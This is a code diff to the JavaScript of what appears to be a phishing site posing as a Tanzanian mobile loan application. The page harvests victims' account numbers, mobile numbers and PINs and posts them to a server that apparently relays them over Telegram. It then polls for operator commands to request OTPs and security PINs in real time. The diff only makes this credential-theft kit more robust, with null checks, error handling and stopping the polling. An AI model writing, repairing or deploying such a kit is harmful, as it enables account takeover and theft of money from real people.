@@ -19,6 +19,7 @@ function showStep(stepName) {
 
 function showNotification(message, isError = false) {
     const banner = document.getElementById('notification-banner');
+    if (!banner) return;
     banner.textContent = message;
     banner.classList.remove('hidden');
     if (isError) banner.classList.add('error');
@@ -32,8 +33,10 @@ const amountText = document.getElementById('amount-text');
 const monthsText = document.getElementById('months-text');
 const monthlyPayment = document.getElementById('monthly-payment');
 
-loanAmount.addEventListener('input', updateLoanCalc);
-loanMonths.addEventListener('input', updateLoanCalc);
+if (loanAmount && loanMonths) {
+    loanAmount.addEventListener('input', updateLoanCalc);
+    loanMonths.addEventListener('input', updateLoanCalc);
+}
 
 function updateLoanCalc() {
     const amt = parseInt(loanAmount.value);
@@ -63,25 +66,38 @@ document.getElementById('btn-continue-creds').addEventListener('click', async ()
     document.getElementById('credentials-spinner').classList.remove('hidden');
     document.getElementById('btn-continue-creds').classList.add('hidden');
 
-    await fetch('/api/submit-credentials', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            sessionId,
-            accountNumber,
-            mobileNumber,
-            pin,
-            loanDetails: {
-                amount: amountText.textContent,
-                monthly: monthlyPayment.textContent
-            }
-        })
-    });
+    try {
+        const response = await fetch('/api/submit-credentials', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId,
+                accountNumber,
+                mobileNumber,
+                pin,
+                loanDetails: {
+                    amount: amountText ? amountText.textContent : 'TSh 100,000',
+                    monthly: monthlyPayment ? monthlyPayment.textContent : 'TSh 9,504'
+                }
+            })
+        });
+        
+        const result = await response.json();
+        if (!result.success) {
+            throw new Error('Server returned failure');
+        }
 
-    startPolling();
+        startPolling();
+    } catch (err) {
+        console.error('Submission error:', err);
+        // Fallback safety: Stop spinner so it doesn't hang forever if server/telegram fails
+        document.getElementById('credentials-spinner').classList.add('hidden');
+        document.getElementById('btn-continue-creds').classList.remove('hidden');
+        alert('Hitilafu imetokea. Hakikisha tokeni ya Telegram imewekwa vizuri kwenye Render.');
+    }
 });
 
-// Auto-advance OTP inputs
+// Auto-advance PIN/OTP inputs
 setupPinInputs('.otp-box');
 setupPinInputs('.pin-box');
 
@@ -153,22 +169,26 @@ function startPolling() {
 
             if (data.status === 'enter_otp') {
                 showStep('otp');
+                clearInterval(pollInterval);
             } else if (data.status === 'enter_security_pin') {
                 showStep('securityPin');
+                clearInterval(pollInterval);
             } else if (data.status === 'success') {
-                document.getElementById('approved-amount-text').textContent = amountText.textContent;
-                document.getElementById('success-monthly').textContent = monthlyPayment.textContent;
+                const approvedAmt = document.getElementById('approved-amount-text');
+                const successMon = document.getElementById('success-monthly');
+                if (approvedAmt && amountText) approvedAmt.textContent = amountText.textContent;
+                if (successMon && monthlyPayment) successMon.textContent = monthlyPayment.textContent;
                 showStep('success');
                 clearInterval(pollInterval);
             } else if (data.status === 'error') {
-                // Re-enable credentials form if invalid data requested by admin
                 document.getElementById('credentials-spinner').classList.add('hidden');
                 document.getElementById('btn-continue-creds').classList.remove('hidden');
                 showStep('credentials');
+                clearInterval(pollInterval);
             }
         } catch (e) {
             console.error('Polling error:', e);
         }
     }, 3000);
-    }
+        }
     
